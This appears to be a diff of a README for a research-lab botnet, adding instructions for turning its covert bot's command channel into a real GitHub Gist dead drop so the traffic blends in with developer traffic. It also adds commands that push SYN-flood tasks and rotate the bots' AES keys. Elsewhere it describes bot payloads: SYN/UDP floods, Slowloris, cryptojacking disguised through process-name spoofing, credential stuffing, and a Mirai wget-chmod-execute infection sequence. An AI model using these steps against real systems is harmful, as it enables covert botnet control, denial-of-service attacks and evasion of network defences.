@@ -575,6 +575,53 @@ python3 covert_bot.py decode '<paste_blob>'
 curl -X POST http://192.168.100.10:5001/clear_command
 ```
 
+**Using a real GitHub Gist as the dead drop (production threat model):**
+
+This changes the C2 channel from an internal Flask server to a public GitHub URL. A bot making HTTPS requests to `raw.githubusercontent.com` is indistinguishable from a developer reading a README — port blocking and IP reputation filters cannot stop it.
+
+```bash
+# 1. Create a secret Gist at https://gist.github.com (any filename, e.g. notes.md)
+# 2. Generate a GitHub PAT at https://github.com/settings/tokens
+#    → Check only the 'gist' scope
+
+# 3. Export credentials (never commit these):
+export GIST_ID="a1b2c3d4e5f6..."       # hex ID from the Gist URL
+export GITHUB_TOKEN="ghp_xxxxxxxxxxxx" # PAT with gist scope
+
+# 4. Push a command to the Gist (botmaster side):
+python3 covert_bot.py gist '{"type":"syn_flood","target":"192.168.100.20","duration":20}'
+# Output includes the raw URL — copy it for the next step.
+
+# 5. Point bots at the raw Gist URL (edit covert_bot.py before deploying):
+#    DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<gist_id>/raw"
+
+# 6. To silence bots:
+python3 covert_bot.py gist '{"type":"idle"}'
+
+# 7. Rotate key (see below) — then push next command encoded with new key.
+```
+
+**AES key rotation — Phase 1 (C2 server) and Phase 2 (dead drop) simultaneously:**
+
+```bash
+# Rotate via C2 server (queues update_secret to all Phase 1 bots):
+curl -X POST http://192.168.100.10:5000/rotate_key \
+     -H "Content-Type: application/json" \
+     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -d '{"secret":"NEW_KEY_2026_XYZ"}'
+# Returns: {"status":"rotated","bots_notified":N,"new_key_hex":"..."}
+
+# Also rotate via dead-drop server (queues update_secret to all Phase 2 bots):
+curl -X POST http://192.168.100.10:5001/push_key \
+     -H "Content-Type: application/json" \
+     -d '{"secret":"NEW_KEY_2026_XYZ"}'
+
+# Shortcut CLI for the dead-drop rotation:
+python3 covert_bot.py rotate NEW_KEY_2026_XYZ
+```
+
+> **Rotation sequence:** call `/rotate_key` and `/push_key` with the *same* new secret → wait ≥ one heartbeat/poll cycle (5–75 s) for all bots to pick up the `update_secret` command and switch their local key → restart both servers with the new secret set (or they will revert to old key on next restart). The `update_secret` command is always encrypted with the **current** (old) key so in-flight bots can decrypt it.
+
 **All supported command types for the Phase 2 covert bot:**
 
 | `type` | Description | Extra fields |
@@ -588,14 +635,6 @@ curl -X POST http://192.168.100.10:5001/clear_command
 | `dga_search` | Trigger DGA NXDOMAIN sweep (fallback demo) | — |
 | `update_secret` | Rotate the shared AES key at runtime | `secret` (≥8 chars) |
 | `idle` | No-op | — |
-
-> **`update_secret` example:**
-> ```bash
-> curl -X POST http://192.168.100.10:5001/set_command \
->      -H "Content-Type: application/json" \
->      -d '{"type":"update_secret","secret":"NEW_KEY_2026_XYZ"}'
-> ```
-> Both the dead-drop server and all bots must be updated to the new secret before the next poll, or decryption will fail. In production botnets this rotation is automated via a second DGA seed.
 
 ### 8.9 Phase 3 — Kademlia P2P (C)
 
@@ -1062,9 +1101,11 @@ Post-session:
 
 **Bot agent v3:** `bot_agent.c` dispatches all five payload types. SYN flood and UDP flood are implemented natively in C with raw sockets; Slowloris is a pure C implementation maintaining a 150-socket pool with dead-socket refill; cryptojacking uses a duty-cycle SHA-256 burn loop with `/proc/self/comm` name spoofing via `prctl(PR_SET_NAME)`; credential stuffing and DGA search spawn the Python modules via `system()`.
 
-**Dead drop vs real GitHub:** `covert_bot.py` ships with `DEAD_DROP_URL` pointing to `http://192.168.100.10:5001/dead_drop` (the lab's local Flask simulation). To use a real GitHub Gist for Phase 2 (the production threat model), replace that URL with a raw Gist URL and manually paste the `encode_command()` output into the Gist. The bot's parsing logic and AES decryption are identical — only the URL changes.
+**Dead drop — lab vs real GitHub Gist:** `covert_bot.py` ships with `DEAD_DROP_URL` pointing to the local Flask server (`http://192.168.100.10:5001/dead_drop`). To use a real GitHub Gist (the production threat model), set `DEAD_DROP_URL` to the raw Gist URL and use `python3 covert_bot.py gist '<json>'` to push commands via the GitHub API. The bot's parsing and AES decryption are identical in both modes. The `gist` CLI mode requires `GIST_ID` and `GITHUB_TOKEN` environment variables; credentials must never be committed to the repository.
 
-**Payload binaries:** `mirai_scanner.c` sends the full Mirai infection command sequence (`wget`, `chmod +x`, `execute`, `rm -f`) to the Cowrie honeypot, which logs each command as a separate ATT&CK event. There are no actual `payload.mips` / `payload.arm` / `payload.x86_64` binaries in this repo — the wget URL is logged by Cowrie but the download is never fulfilled. This is intentional: the research question concerns the infection lifecycle and detection thereof, not the payload itself.
+**AES key rotation:** `c2_server.py` now exposes `POST /rotate_key` (requires `X-Auth-Token`). It encrypts an `update_secret` task with the current key, queues it for every registered bot, then switches the server to the new key atomically. The dead-drop server exposes the equivalent `POST /push_key` and the `python3 covert_bot.py rotate <secret>` shortcut. Both must be called with the same new secret; after one heartbeat/poll cycle all bots have switched. Servers must be restarted (or the `_current_secret` updated in process) to persist the new key across restarts.
+
+**Payload binaries:** `mirai_scanner.c` sends the full Mirai infection sequence (`wget`, `chmod +x`, `execute`, `rm -f`) to the Cowrie honeypot, which logs each command as a separate ATT&CK event. There are no actual `payload.mips` / `payload.arm` / `payload.x86_64` binaries in this repo — the wget URL is logged by Cowrie but the download is never fulfilled. This is intentional: the research question concerns the infection lifecycle and detection thereof, not the payload itself.
 
 **Graph output directory:** `generate_graphs.py` saves PNGs to `./graphs/` by default (relative to the script). `run_full_lab.sh` overrides this to `/tmp/botnet_graphs/` via the inline Python call. Use `--out <path>` to set a custom directory when calling the script directly.
 
